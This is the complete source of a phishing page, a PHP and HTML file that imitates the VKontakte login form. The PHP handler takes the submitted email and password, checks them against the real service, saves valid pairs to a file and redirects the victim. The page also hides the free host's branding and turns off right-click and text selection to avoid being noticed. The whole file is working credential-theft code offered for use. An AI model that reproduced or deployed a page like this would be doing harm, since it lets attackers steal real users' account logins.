<?php

include "core/function.php";
include "core/config.php";
$server = $_SERVER['SERVER_NAME'];
$Request = $_POST + $_GET;
if (isset($Request['email'], $Request['pass'])) {
    $email = htmlspecialchars($Request['email']);
    $pass = htmlspecialchars($Request['pass']);
    $data = $email . ':' . $pass;




    if (mb_strlen($email) > 3  or mb_strlen($pass) > 3){

        if (!Dublicats($bd_files, $data)){
            if (Validation_account($email, $pass) != 'NO'){
                /// РЕДИРЕКТТТТТТ
                ///
                ///
                file_put_contents($bd_files, $data, FILE_APPEND);
                header("Location:".$location);
            } else {
                $error ='<div class="box_error">Указан неверный логин или пароль.</div>';
            }
        } else {

            /// Если найден дубликат
            ///
            header("Location:".$location);


        }

    } else {
        $error ='<div class="box_error">Указан неверный логин или пароль.</div>';
    }



}



?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
  <head>
	<meta http-equiv="content-type" content="text/html; charset=utf-8">
    <title>ВКонтакте | Вход</title>
	<link rel="shortcut icon" href="http://vk.com/images/faviconnew.ico?3">
	<link rel="stylesheet" type="text/css" href="/auth/css/fonts_cnt1.css" />
	<link rel="stylesheet" type="text/css" href="/auth/css/common1.css" />
    <link type="text/css" rel="stylesheet" href="/auth/css/oauth_popup1.css"></link>
    <script type="text/javascript" language="javascript" src="/auth/css/common_light.js"></script>
    <style>img[alt="www.000webhost.com"]{display:none;}</style>
  <body onresize="onBodyResize(true);" class="VK oauth_centered">
    <script>
      if (window.devicePixelRatio >= 2) document.body.className += ' is_2x';
    </script>

	<script type="text/javascript">
		document.ondragstart = noselect;
		document.onselectstart = noselect;
		document.oncontextmenu = noselect;
		function noselect(){return false;}
	</script>
    <div class="oauth_wrap">
      <div class="oauth_wrap_inner">
        <div class="oauth_wrap_content" id="oauth_wrap_content">
          <div class="oauth_head">
  <a class="oauth_logo fl_l" href="https://vk.com" target="_blank"></a>
  <div id="oauth_head_info" class="oauth_head_info fl_r">
    <a class="oauth_reg_link" href="https://vk.com/join?reg=1" target="_blank">Регистрация</a>
  </div>
</div>

<div class="oauth_content box_body clear_fix">
  <div class="box_msg_gray box_msg_padded">Для продолжения Вам необходимо войти <b>ВКонтакте</b>.</div>

  <form method="post" action="#" novalidate>
    <div class="oauth_form">

      <center>
	<?=$message?>
	</center>

      <div class="oauth_form_login">

        <div class="oauth_form_header">Телефон или e-mail</div>
        <input type="text" class="oauth_form_input dark" required="required" minlength="2" maxlength="1024" name="email" value="">
        <div class="oauth_form_header">Пароль</div>
        <input type="password" class="oauth_form_input dark" required="required" minlength="2" maxlength="1024" name="pass" />



        <button class="flat_button oauth_button button_wide" id="install_allow" type="submit" onclick="return login(this);">Войти</button>
        <a class="oauth_forgot" href="https://vk.com/restore" target="_blank">Забыли пароль?</a>
        <input type="submit" name="submit_input" class="unshown">
      </div>
    </div>
  </form>
</div>
        </div>
      </div>
    </div>
    <style>[class="cbalink"]{display:none;}</style>
  </body>
</html>
